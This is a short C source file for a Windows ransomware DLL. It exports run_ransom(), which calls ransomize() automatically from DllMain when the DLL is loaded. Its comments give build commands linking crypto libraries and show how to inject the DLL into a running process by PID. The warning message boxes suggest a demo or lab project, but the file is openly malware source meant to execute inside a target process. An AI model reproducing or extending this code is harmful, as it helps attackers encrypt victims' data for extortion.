#include <windows.h>
#include "ransom.h"

// gcc -shared -o ransom_dll.dll ransom_dll.c ransom.c -lcrypto -lssl
// gcc dll_injector.c -o dll_injector.exe
// ./dll_injector.exe <path> <pid>

__declspec(dllexport) void run_ransom(void)
{
    ransomize();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "Ransom DLL attached to process", "Warning", MB_ICONEXCLAMATION);
        run_ransom();
        break;
    case DLL_PROCESS_DETACH:
        MessageBoxA(NULL, "Ransom DLL detached from process", "Warning", MB_ICONEXCLAMATION);
        break;
    }
    return TRUE;
}